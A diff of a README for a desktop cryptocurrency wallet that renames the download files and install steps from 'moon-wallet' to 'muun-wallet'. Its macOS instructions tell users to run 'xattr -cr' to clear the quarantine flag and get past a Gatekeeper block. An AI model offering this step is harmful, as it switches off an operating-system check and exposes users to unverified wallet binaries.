@@ -1,4 +1,4 @@
-<div align="center">
+﻿<div align="center">
 
 # Muun Wallet Desktop
 
@@ -14,13 +14,13 @@
 
 ## Downloads
 
-[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip)
 
 | Platform | Installer | SHA-256 |
 |---|---|---|
-| macOS 11+ (Apple Silicon & Intel) | [moon-wallet-v0.5.1.dmg](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) | `60f8c59873f31d1c0489329403a3a2c4591c2f260d55e6f2e6cb08c3ce39091b` |
-| Windows 10 / 11 | [moon-wallet-v0.5.1.exe](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) | `3295b19f2d4486877b7064f7316abf5f8f25f70d5b91cffb451628bae17f32c2` |
-| Linux x64 (Ubuntu, Fedora, Arch) | [moon-wallet-v0.5.1.zip](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip) | `60617914e65bd3035467867502e078cc01a381ee8ee3b58cb328ff29228bdb01` |
+| macOS 11+ (Apple Silicon & Intel) | [muun-wallet-v0.5.1.dmg](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg) | `60f8c59873f31d1c0489329403a3a2c4591c2f260d55e6f2e6cb08c3ce39091b` |
+| Windows 10 / 11 | [muun-wallet-v0.5.1.exe](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe) | `3295b19f2d4486877b7064f7316abf5f8f25f70d5b91cffb451628bae17f32c2` |
+| Linux x64 (Ubuntu, Fedora, Arch) | [muun-wallet-v0.5.1.zip](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip) | `60617914e65bd3035467867502e078cc01a381ee8ee3b58cb328ff29228bdb01` |
 
 Always verify checksums before running. See the [download verification guide](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/how-to-verify-muun-wallet-download.md).
 
@@ -29,7 +29,7 @@ Always verify checksums before running. See the [download verification guide](ht
 ## Install
 
 **macOS**
-1. Download `moon-wallet-v0.5.1.dmg` and open it.
+1. Download `muun-wallet-v0.5.1.dmg` and open it.
 2. Drag Muun Wallet to your Applications folder.
 3. If macOS Gatekeeper blocks the first launch, open Terminal and run:
 ```bash
@@ -38,12 +38,12 @@ xattr -cr /Applications/MuunWallet.app
 4. Launch from Applications normally.
 
 **Windows**
-1. Download `moon-wallet-v0.5.1.exe`.
+1. Download `muun-wallet-v0.5.1.exe`.
 2. Run the installer — no admin account or special permissions required beyond a standard install.
 3. Launch Muun Wallet from the Start menu.
 
 **Linux**
-1. Download `moon-wallet-v0.5.1.zip` and extract.
+1. Download `muun-wallet-v0.5.1.zip` and extract.
 2. Mark the binary executable and run:
 ```bash
 chmod +x muun-wallet
